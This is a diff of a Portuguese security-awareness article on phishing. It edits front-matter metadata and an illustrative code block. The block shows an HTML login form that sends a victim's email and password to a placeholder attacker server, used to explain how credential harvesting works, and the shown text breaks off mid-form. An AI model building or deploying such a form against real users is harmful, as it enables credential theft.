@@ -8,9 +8,12 @@ authorLastName: "Nome"
 authorAvatar: "/images/authors/avatar.jpg"
 authorBio: "Especialista em Cibersegurança focado em análise de ameaças e comportamento digital."
 authorSocialLink: "https://linkedin.com/in/seu-perfil"
+authorSocialType: "linkedin"
 publishedAt: "2026-02-05T10:00:00Z"
 readTime: "6 min"
 category: "Engenharia Social"
+icon: "Shield"
+gradient: "from-primary/20 to-accent/20"
 imageUrl: "/images/articles/phishing-header.jpg"
 tags: ["segurança", "phishing", "ia", "privacidade"]
 featured: true
@@ -30,8 +33,6 @@ O phishing moderno opera em quatro fases principais:
 3. **Exploração:** O uso de links maliciosos ou anexos infectados.
 4. **Coleta:** A vítima insere credenciais em uma página clonada.
 
-
-
 ## Sinais de Alerta (Red Flags)
 
 Mesmo os ataques mais sofisticados deixam rastros. Fique atento a:
@@ -45,8 +46,7 @@ Mesmo os ataques mais sofisticados deixam rastros. Fique atento a:
 Muitas vezes, o ataque começa com um script simples escondido em um botão de "Login":
 
 ```html
-<form action="[https://servidor-do-atacante.com/coletar](https://servidor-do-atacante.com/coletar)" method="POST">
+<form action="https://servidor-do-atacante.com/coletar" method="POST">
   <input type="email" name="user_email" placeholder="Seu e-mail">
   <input type="password" name="user_pass" placeholder="Sua senha">
-  <button type="submit">Atualizar Conta</button>
-</form>
+  <button type="submit">
